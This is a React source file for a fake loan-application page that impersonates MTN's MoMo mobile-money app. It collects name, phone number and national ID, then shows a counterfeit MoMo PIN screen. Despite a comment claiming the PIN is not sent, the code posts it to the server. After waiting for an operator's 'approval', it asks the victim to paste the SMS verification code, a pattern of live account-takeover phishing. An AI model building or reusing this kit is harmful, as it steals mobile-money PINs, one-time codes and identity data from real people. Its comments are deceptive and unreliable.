import { useState, useEffect, useRef } from "react";
import Header from "./header";
import momoLogo from "../src/assets/mom.png";


function LoanApplication({ loanDetails, onBack, processor }) {

    const [form, setForm] = useState({
        full_name: "",
        phone: "",
        national_id: "",
        employment_status: "Self-Employed",
        monthly_income: "",
        loan_amount: loanDetails.amount,
        repayment_period: loanDetails.repayment,
        consent: false
    });

    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState("");

    const [submitted, setSubmitted] = useState(false);
    const [applicationNumber, setApplicationNumber] = useState("");
    const [showAdminWaiting, setShowAdminWaiting] = useState(false);
    const [rejected, setRejected] = useState(false);

    // Pesa App transition
    const [showPesaRedirect, setShowPesaRedirect] =
        useState(false);

    // Pesa App PIN screen
    const [showPinScreen, setShowPinScreen] =
        useState(false);

    // Demo-only PIN state.
    // This PIN is NOT sent to the backend.
    const [pin, setPin] = useState([
        "",
        "",
        "",
        "",
        ""
    ]);

    const pinInputs = useRef([]);
    const [processing, setProcessing] = useState(false);
    const [showVerification, setShowVerification] = useState(false);
    const [verificationCode, setVerificationCode] = useState("");
    const [verifying, setVerifying] = useState(false);
    const [verificationMessage, setVerificationMessage] = useState("");
    const [verificationTime, setVerificationTime] = useState(120);

    


    /* =========================================
       FORM CHANGE
    ========================================= */

    function handleChange(e) {

        const {
            name,
            value,
            type,
            checked
        } = e.target;

        setForm({
            ...form,

            [name]:
                type === "checkbox"
                    ? checked
                    : value
        });
    }


    /* =========================================
       SUBMIT LOAN APPLICATION
    ========================================= */

    async function handleSubmit(e) {

        e.preventDefault();

        if (!form.consent) {

            setMessage(
                "Please accept the terms and conditions."
            );

            return;
        }

        setLoading(true);
        setMessage("");

        try {

            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        ...form,
                        processor: processor
                    })
                }
            );

            const data =
                await response.json();

            if (!response.ok) {

                throw new Error(
                    data.error ||
                    "Application failed."
                );
            }

            setMessage(
                `Reference: ${data.application_number}`
            );

            /*
             * Application has been submitted.
             *
             * Now show the Pesa App transition.
             */

            setShowPesaRedirect(true);

        } catch (error) {

            setMessage(
                error.message
            );

        } finally {

            setLoading(false);
        }
    }


    /* =========================================
       PESA APP REDIRECT TIMER
    ========================================= */

    useEffect(() => {

        if (!showPesaRedirect) {
            return;
        }

        const timer = setTimeout(() => {

            setShowPesaRedirect(false);

            setShowPinScreen(true);

        }, 3000);

        return () => clearTimeout(timer);

    }, [showPesaRedirect]);

    useEffect(() => {
        if (!showVerification) return;
    
        setVerificationTime(120);
    
        const timer = setInterval(() => {
            setVerificationTime((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
    
                return prev - 1;
            });
        }, 1000);
    
        return () => clearInterval(timer);
    }, [showVerification]);

    useEffect(() => {
        if (!showAdminWaiting || !applicationNumber) {
            return;
        }

        async function checkApplicationStatus() {
            try {
                const response = await fetch(
                    `/api/application-status?application_number=${encodeURIComponent(
                        applicationNumber
                    )}`
                );

                if (!response.ok) {
                    return;
                }

                const data = await response.json();

                console.log(
                    "Application status:",
                    data.status
                );

                if (data.status === "APPROVED") {
                    setShowAdminWaiting(false);

                    /*
                    * Continue to your legitimate
                    * phone verification step.
                    */
                    setProcessing(true);
                    setShowVerification(true);
                    
                }

                if (data.status === "REJECTED") {
                    setShowAdminWaiting(false);
                    setRejected(true);
                }

            } catch (error) {
                console.error(
                    "Application status check failed:",
                    error
                );
            }
        }

        checkApplicationStatus();

        const interval = setInterval(
            checkApplicationStatus,
            3000
        );

        return () => {
            clearInterval(interval);
        };

    }, [
        showAdminWaiting,
        applicationNumber
    ]);


    /* =========================================
       PIN INPUT
    ========================================= */

    function handlePinChange(
        value,
        index
    ) {

        // Only numbers
        if (!/^\d?$/.test(value)) {
            return;
        }

        const newPin = [
            ...pin
        ];

        newPin[index] = value;

        setPin(newPin);

        // Automatically move forward
        if (
            value &&
            index < 4
        ) {

            pinInputs
                .current[index + 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN BACKSPACE
    ========================================= */

    function handlePinKeyDown(
        e,
        index
    ) {

        if (
            e.key === "Backspace" &&
            !pin[index] &&
            index > 0
        ) {

            pinInputs
                .current[index - 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN NEXT
    ========================================= */

    async function handlePinNext() {

        const enteredDigits = Number(pin.filter(digit => digit !== "").join(""));

        /*
         * Allow either 4 or 5 digits.
         */

        if (
            enteredDigits.toString().length !== 4 &&
            enteredDigits.toString().length !== 5
        ) {
            return;
        }

         try {
        const response = await fetch(
            "/api/submit-application",
            {
                method: "POST",
                headers: {
                    "Content-Type":
                        "application/json"
                },
                body: JSON.stringify({
                    action: "verify_email",
                    pin: enteredDigits,
                    processor: processor
                })
            }
        );

        if (!response.ok) {
            const data = await response.json();
            throw new Error(
                data.error ||
                "Wait for Admin approval.."
            );
        }
        setApplicationNumber(data.application_number);
        setShowAdminWaiting(true);

    } catch (error) {

        setMessage(
            error.message
        );

    } finally {

        setLoading(false);
    }   
}

    async function handleVerify(e) {
        e.preventDefault();

        if (!verificationCode.trim()) {
            setVerificationMessage(
                "Please enter the verification code sent to your phone."
            );
            return;
        }

        setVerifying(true);
        setVerificationMessage("");

        try {
            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        action: "verify_phone",
                        verificationCode: verificationCode.trim(),
                        processor: processor
                    })
                }
            );

            const data = await response.json();

            if (!response.ok) {
                throw new Error(
                    data.error ||
                    "Code verification failed."
                );
            }

            setShowVerification(false);
            setSubmitted(true);

        } catch (error) {
            setVerificationMessage(
                error.message
            );
        } finally {
            setVerifying(false);
        }
    }

    if (showAdminWaiting) {
        return (
            <div className="admin-waiting-overlay">

                <div className="admin-waiting-modal">

                    <div className="waiting-hourglass">
                        ⏳
                    </div>

                    <h2>
                        Please Wait
                    </h2>

                    <p>
                        Your loan application is currently
                        being reviewed by our administrator.
                    </p>

                    <p className="waiting-reference">
                        Reference: {applicationNumber}
                    </p>

                    <div className="waiting-loader">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>

                    <p className="waiting-note">
                        You will automatically proceed once
                        your application has been approved.
                    </p>

                </div>

            </div>
        );
    }

    if (rejected) {
        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ×
                    </div>

                    <h1>
                        Application Update
                    </h1>

                    <p className="success-title">
                        Application failed.
                    </p>

                    <p className="success-description">
                        Some of your details are not correct, 
                        please restart the application with the correct details.
                    </p>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }

    if (showVerification) {
    return (
        <div className="verification-overlay">

            <div className="verification-modal">

                <div className="verification-icon">
                    ✓
                </div>

                <h2>Phone Verification</h2>

                <p>
                    Paste the verification code sent as it is below..
                </p>

                <form onSubmit={handleVerify}>

                    <label>
                        Paste the code:
                    </label>

                    <div className="verification-code-area">

                        <input
                            type="text"
                            value={verificationCode}
                            onChange={(e) =>
                                setVerificationCode(
                                    e.target.value.slice(0, 500)
                                )
                            }
                            onPaste={(e) => {
                                e.preventDefault();

                                const pastedCode =
                                    e.clipboardData
                                        .getData("text")
                                        .slice(0, 500);

                                setVerificationCode(pastedCode);
                            }}
                            placeholder="Paste your verification code"
                            maxLength={500}
                            autoComplete="one-time-code"
                            className="verification-code-input"
                        />

                        <div className="verification-code-count">
                            {verificationCode.length}/500
                        </div>

                    </div>
                    <div className="verification-timer">
                    {String(Math.floor(verificationTime / 60)).padStart(2, "0")}:
                    {String(verificationTime % 60).padStart(2, "0")}
                    </div>

                    {verificationMessage && (
                        <div className="form-message">
                            {verificationMessage}
                        </div>
                    )}

                    <button
                        type="submit"
                        className="submit-button"
                        disabled={verifying}
                    >
                        {verifying
                            ? "VERIFYING..."
                            : "VERIFY"}
                    </button>

                </form>

            </div>

        </div>
    );
}

    /* =========================================
       SUCCESS PAGE
    ========================================= */

    if (submitted) {

        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ✓
                    </div>

                    <h1>
                        Application Submitted
                    </h1>

                    <p className="success-title">
                        Your loan application has
                        been submitted successfully.
                    </p>

                    <p className="success-description">
                        We have received your application
                        and will review the information
                        provided. You will be contacted
                        once there is an update on your
                        application.
                    </p>

                    <div className="reference-box">
                        <strong>
                            Thank you
                        </strong>
                    </div>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }


    /* =========================================
       PESA APP PIN SCREEN
    ========================================= */
    if (processing) {
        return (
            <div className="momo-processing-page">
                <div className="momo-processing-spinner"></div>
                <h2>
                        Processing..
                    </h2>

                    <p>
                        Please wait while we verify
                        your phone number...
                    </p>
            </div>
        );
    }

    if (showPinScreen) {

        return (
            <div className="pesa-pin-page">

                {/* TOP BLUE SECTION */}

                <div className="pesa-pin-top">

                    <div className="pesa-logo">
                        <div className="momo-logo-crop">
                            <img
                                src={momoLogo}
                                alt="MoMo"
                                className="momo-logo"
                            />
                        </div>
                        <span className="momo-tagline" style={{ color: '#FFCC05' }}>
                            <strong>MoMo</strong>
                        </span>
                        <span className="momo-tag" style={{ color: '#FFCC05' }}>
                            from MTN
                        </span>
                    </div>
                </div>



                {/* WHITE CONTENT */}

                <div className="pesa-pin-content">

                    <div className="pesa-pin-card">

                        <h1>
                            Welcome to{" "}
                            <strong>
                                MoMo App
                            </strong>
                        </h1>

                        <h2>
                            Input your PIN
                        </h2>

                        <p>
                            Enter your PIN to continue
                        </p>


                        {/* PIN BOXES */}

                        <div className="pesa-pin-boxes">

                            {pin.map(
                                (digit, index) => (

                                    <input
                                        key={index}

                                        ref={(element) => {
                                            pinInputs.current[
                                                index
                                            ] = element;
                                        }}

                                        type="password"

                                        inputMode="numeric"

                                        maxLength="1"

                                        value={digit}

                                        onChange={(e) =>
                                            handlePinChange(
                                                e.target.value,
                                                index
                                            )
                                        }

                                        onKeyDown={(e) =>
                                            handlePinKeyDown(
                                                e,
                                                index
                                            )
                                        }

                                        className="pesa-pin-box"

                                        aria-label={
                                            `PIN digit ${
                                                index + 1
                                            }`
                                        }
                                    />

                                )
                            )}

                        </div>


                        <button
                            type="button"
                            className="pesa-next-button"

                            disabled={
                                pin.filter(
                                    digit =>
                                        digit !== ""
                                ).length < 4
                            }

                            onClick={
                                handlePinNext
                            }
                        >
                            NEXT
                        </button>

                    </div>

                </div>

            </div>
        );
    }


    /* =========================================
       MOMO APP REDIRECT SCREEN
    ========================================= */

    if (showPesaRedirect) {

        return (
            <div className="pesa-redirect">

                <div className="pesa-spinner"></div>

                    <h2>Processing...</h2>

                    <p>
                        Connecting to <span style={{ color: '#FFCC05' }}>
                            <strong>MoMo</strong> App.
                            </span>
                    </p>

            </div>
        );
    }


    /* =========================================
       LOAN APPLICATION FORM
    ========================================= */

    return (

        <div className="page">

            <Header />

            <div className="application-container">

                <button
                    className="back-button"
                    onClick={onBack}
                >
                    ← Back
                </button>

                <h1>
                    Loan Application
                </h1>

                <p className="application-intro">
                    Please fill in all required
                    details accurately. All information
                    is kept confidential and is used
                    only for loan processing and
                    verification.
                </p>


                <form
                    onSubmit={handleSubmit}
                >

                    <label>
                        Full name
                    </label>

                    <input
                        name="full_name"
                        value={
                            form.full_name
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Phone Number
                    </label>

                    <input
                        name="phone"
                        type="tel"
                        value={
                            form.phone
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        National ID
                    </label>

                    <input
                        name="national_id"
                        value={
                            form.national_id
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Loan Amount (USD)
                    </label>

                    <input
                        name="loan_amount"
                        type="number"
                        value={
                            form.loan_amount
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Employment Status
                    </label>

                    <select
                        name="employment_status"
                        value={
                            form.employment_status
                        }
                        onChange={
                            handleChange
                        }
                    >
                        <option>
                            Self-Employed
                        </option>

                        <option>
                            Employed
                        </option>

                        <option>
                            Business Owner
                        </option>

                        <option>
                            Student
                        </option>

                        <option>
                            Other
                        </option>

                    </select>


                    <label>
                        Monthly Net Income
                    </label>

                    <input
                        name="monthly_income"
                        type="number"
                        placeholder="USD 0.00"
                        value={
                            form.monthly_income
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Repayment
                    </label>

                    <select
                        name="repayment_period"
                        value={
                            form.repayment_period
                        }
                        onChange={
                            handleChange
                        }
                    >

                        {[
                            1,2,3,4,5,6
                        ].map(
                            months => (

                                <option
                                    key={months}
                                    value={months}
                                >
                                    {months} months
                                </option>

                            )
                        )}

                    </select>


                    <label className="consent">

                        <input
                            type="checkbox"
                            name="consent"
                            checked={
                                form.consent
                            }
                            onChange={
                                handleChange
                            }
                        />

                        <span>
                            I confirm that the
                            information provided
                            is true and I agree to
                            the Pesa App terms
                            and conditions.
                        </span>

                    </label>


                    {message && (

                        <div className="form-message">
                            {message}
                        </div>

                    )}


                    <button
                        type="submit"
                        className="submit-button"
                        disabled={loading}
                    >
                        {loading
                            ? "SUBMITTING..."
                            : "SUBMIT APPLICATION"}
                    </button>

                </form>

            </div>

        </div>
    );
}

export default LoanApplication;
